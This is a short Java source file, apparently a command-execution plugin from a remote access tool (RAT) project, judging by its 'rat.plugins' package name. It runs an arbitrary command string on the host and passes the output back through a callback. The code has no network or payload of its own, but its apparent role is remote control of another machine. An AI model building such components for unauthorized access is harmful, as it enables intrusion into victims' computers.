package rat.plugins.command;

import rat.plugins.Task;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class CommandTask implements Task
{
    private String command;
    private CommandCallback callback;

    public CommandTask(String command)
    {
        this(command, null);
    }

    public CommandTask(String command, CommandCallback callback)
    {
        this.command = command;
        this.callback = callback;
    }

    @Override
    public void run()
    {
        try
        {
            System.out.println("running command");

            System.out.println(command);

            Process process = Runtime.getRuntime().exec(command);

            if (callback != null)
            {
                InputStream inputStream = process.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

                StringBuilder stringBuilder = new StringBuilder();

                String line;
                while ((line = reader.readLine()) != null)
                {
                    stringBuilder.append(line).append("\n");
                }

                callback.onCallback(stringBuilder.toString());
            }
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }
}
